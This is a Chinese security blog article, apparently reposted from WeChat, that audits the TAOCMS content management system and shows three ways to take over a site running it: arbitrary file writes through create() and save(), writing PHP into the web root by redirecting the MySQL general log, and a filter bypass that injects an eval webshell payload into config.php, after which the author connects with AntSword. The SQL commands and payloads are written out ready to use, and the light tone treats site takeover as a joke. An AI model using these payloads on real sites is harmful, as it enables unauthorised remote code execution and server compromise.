<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4m74e0PU2J7cW1NID_8pgw)

简介
--

TAOCMS 是一个完善支持多数据库 (Sqlite/Mysql) 的 CMS 网站内容管理系统，是国内最小的功能完善 的基于 php+SQLite/Mysql 的 CMS。体积小（仅 180Kb）速度快，包含文件管理、数据采集、 Memcache 整 合、用户管理等强大功能，跨平台运行，支持 SAE、BAE 云服务。兼容 PHP5 和 PHP7. 代码 手写采用严格的数据过滤，保证服务器的安全稳定！

简简单单的文件上传
---------

通过对源代码的扫描出现了几个奇怪函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSJmv1efdhMzibXCh0ffr7zhu5GcavAVAWiaPxE4UkhibKlh27OkTiabTuAw/640?wx_fmt=png&from=appmsg)

跟进去看一下代码，这里会根据 GET 到的 name 来进行判断，再通过参数是否存在 isdir 来确定是否为 目录是创建目录，不是则创建文件 fopen（），且未限制后缀直接 get 写入。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSk4cBuKknzDQJ17GiacHtKOvEXec7oILYGxts8AfBicW1y3ZcOMWjYEiaQ/640?wx_fmt=png&from=appmsg)

再来看一下 save 函数，先判断是否有权限写入，如果权限存在写入即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSsosG3z6r2urHcS5ErjpSXfujEujn4FD65Spia3SlUlVd3ibvvJsUjr6Q/640?wx_fmt=png&from=appmsg)

利用链为先利用 create() 函数创建文件，在利用 save() 函数进行内容写入，即可造成任意文件上传。

mysqlog getshell
----------------

看到这个功能点，执行 sql 语句跟进去

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSWGpEx6E2gpc0Gz0yIiafMMegciaoEV2vWfTsYqF3DiageLibicqia7gQiasbg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeS55FTveTpNiayicezlunFN43elibswJuFWT9qGvuETpTj8Lho7oymkicRUA/640?wx_fmt=png&from=appmsg)

根据自己盲测感觉是没有过滤语句，根据路由跟进去在 sql.php/excute() 函数，这里看到直接把 post 进来魔术函数转换了一下 sqltext，我们跟进去看看，这里不是数组进入 else 分支利用 stripslashes() 函数 删除由 addslashes() 函数添加的反斜杠。去掉反斜杠可能是为了更好的适配把，我们这里就等于 sql 语句 未过滤，全部输入了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeS5B56G7nXvWC7hBjIZhvep0UZZGicMOUibudGbVlfOvtVLZJkfY3mibIaA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSLV2UvCgSAiaYlkwxzjDaYfqeIQ0ejyfiaZlvuNDXtGs39vLLIg6rYNHw/640?wx_fmt=png&from=appmsg)

我们在跟一下 query() 函数，这里跟进去看到直接原汤化原食，也没有任何操作直接 mysql_query().

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSl8k3NR5VliaeJDkPibaGunwXtoTlcpr5fpmTBl4eKYwMPnbMnp8KoqJw/640?wx_fmt=png&from=appmsg)

俗话说不能 getshell 的功能都不是好功能，我们现在来思考一下，mysql 数据库 getshell 的方式，大 家第一个想到的坑定就是 mysql 数据库 log 日志 getshell,mysql 数据库 log 日志 getshell 的必要条件

```
1、知道网站真实物理路径
2、root用户身份
3、MySQL 版本 > 5.0


```

*   首先确定物理路径，其实这个 cms 很简单获取，不能说是十分简单把只能说是非常简单
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSWxlcbGbCNpxuicTRxpgMwz5zJBstD9fD2kZRXYEA9rR4pIMpvphkiauw/640?wx_fmt=png&from=appmsg)

*   确定是否为 root 权限，这里是假设的一种可能，就使用了 root 权限了
    

```
1.SHOW VARIABLES LIKE '%general%'
2.SELECT user();
3.SELECT version();


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeS3Yl2iadORDbs5qJ1ZniaD4nSNhXgWZcyzY3Cc92NGz5dtzWZhqicUiakVQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSkWH4bl19E9ZsmtiaicSiclaOzvKI1eTmQMv7mvseOcYDia5G2508ODzibmQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSbjKt3nPRaPao8Omiam1MmicMGhbSWAfFibIicrQZtezNLAsJ5O4GQSRjWA/640?wx_fmt=png&from=appmsg)

*   前提条件都符合，接下来就需要开启日志记录，把日志文件指向 web 目录即可
    

```
set global general_log = 'ON';
set global general_log_file ='D:/phpstudy_pro/WWW/taocms/test_1.php'
select "<?php phpinfo();?>"


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSeicqGwKMEynLjPxSibk6OMsaian9iccrkFmiaofoExE4PVHibR84qvHes9bQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSPHYnSSDzian0YusxmicoymTjmyaoiaheVuXkOicp65iaI39u8lzVeQvW5sQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSn0I0E7M8D0RhtA9IMkvN4UtwvVyG2BEMQ7KIteg2zI8TiaUFMVcvUXA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeS9Rx2icSTLXZ7sJ9mlpichX6r1OHwLl0sK7cL17YUxLWy9hw0HmibHVSww/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeS2EriaeynYLGibofT3d3suqXEqRaibkVj6WOyj0l3KEe80XPuYQcP7cfjQ/640?wx_fmt=png&from=appmsg)

我们访问看看，至此靓仔们写入自己传家大宝贝即可~

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSxcRQ2Uu28GPFSKbF9ItSlE6e8UyIADFB0BdbXxWPhwxM3hHso20lsQ/640?wx_fmt=png&from=appmsg)

修改配置文件 getshell
---------------

通过代码审计工具，扫描到在 include\Model\config.php, 存在 file_put_contents() 函数，我们这里 追踪一下看看 $configData 是不是可控。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSAw1dVIE2CFiaRybVGA5JGoiaQDiafOfXAlBYpjcTzZsI0zKuc6gDnLljg/640?wx_fmt=png&from=appmsg)

这里先判断是否存在修改权限，然后剔除无用参数，然后通过循环遍历出来其他参数，在经过 safeword（）函数进行过滤写入，这里基本可以判断我们 $configData 是我们输入的，输入可控 我们来 跟进看看过滤是否存在绕过行为。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSDB2HGibYR5FOQUERiadiahFceredckCkicqSZucAzCSicfibicvwhQCwnzicNg/640?wx_fmt=png&from=appmsg)

这里 safeword() 存在两个函数的传入 一个传入的 text 的值，一个是写死的 level=8，这里我不太能理 解这个写死是什么意思，不重要了我们跟一下逻辑，首先判断传入的 text 是不是数组，明显我们这次传 参是文本，然后进入 switch 语句，level 的值写死为 8，直接进入 default 分支，首先判断是不是 sqlite 数据 库，如果是就进行单引号替换为双引号，如果不是进入 addslashs() 函数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSN8LWK9VtUdTvHYhae4F7KfJb3W8NsxYUUYpxVibRlz7ztY2r1IP4hIA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSXVGjgAbtWo73rduLRr9YlqGicPk8MWCwqWbp0NTBXianIIlGrrBk1G6Q/640?wx_fmt=png&from=appmsg)

这里我们继续跟进 addslashs() 函数，很简单就是调用 addslashes() 函数对输入内容进行过滤，就是 在预定义的字符前面添加反斜杠。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSNFuhvLqAlRyRxMkPiaK84FpF19n3NlP1diaLgfrht0bemZib3S7sicvmqQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSljaEibfE4bbZ7rRicH7QosGn7XPgv4ysUUibFGicicgtVBJv4jnZj6rtj1Q/640?wx_fmt=png&from=appmsg)

这里思考一下，我们需要怎么 getshell 呢，第一我们要选择数据库为 sqlite，然后提交一下但是这里 站已经炸了，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSeQ2XH0LmjpeTuiaR665ibM6QqEhZibRSGTicxupr3I7aglSib3ceNcBAnlQ/640?wx_fmt=png&from=appmsg)

然后通过函数特性进行写入 payload 闭合就好了

```
define('WEBNAME', 'taoCMS演示'); //初始值
define('WEBNAME', '@eval($_REQUEST[1]);'); //正常写入后
define('WEBNAME', '\'');@eval($_REQUEST[1]);//'); //闭合后的payload
\');@eval($_REQUEST[1]);// 闭合后的提交paylod


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSWF6uoicWcSAS7gQHZVIKGDtzXHUYFDyY7ibr5QcbmJge1WYHBzW7ibOBA/640?wx_fmt=png&from=appmsg)

哈哈哈哈哈，成功炸掉网站

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSHh7UdGesxC3aczROufszFBibN858jNia0UwoaD7uOI3AehxyuPgdYmkQ/640?wx_fmt=png&from=appmsg)

这里监控到文件修改了，我们看看 config 文件有没有按照我们的想法写入，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSAqI93I27FGPRLicCmnnR3qEguZzZtmpalBgLpUwJQuvrVic6LoBR4OQw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSnPAcxHlbze9yqDwUYcic4gzw4BEHsib2FcXYopLMTh3qeGbd0FXeRMjw/640?wx_fmt=png&from=appmsg)

蚁剑连接 OK 好的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSzWYZ1FNsqm5Jb4N5icziaP3MzMic4tHiaiarUMaoI9iasdNHUibadEKSAiaRFw/640?wx_fmt=png&from=appmsg)

总结一下
----

如果是 mysql 的数据库，这个漏洞会炸站，大家谨慎使用 一不小心人就容易进去哈哈哈 ，靓仔们越 来越刑了啊 补救方法就是拿到 shell 后进入配置文件修改 db 为 mysql 就好了 但是这个漏洞利用还是不推荐利用 真的真的，因为要是 shell 没写好的话真的会炸穿。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4N7OU9OwxnH24zTBaVvjeSCnzRaicQyqn54dTiaN9nUZvDT4ta5PDmvyQ19Uy2MiaVTD4Sp39Y5nnKg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4uGd5On9znicFLl2SBlgZrYCl9TyWsAIwMw0lsoOH2LZaualriciaXsTWicqs8V78g57B95gFeZjCaog/640?wx_fmt=png)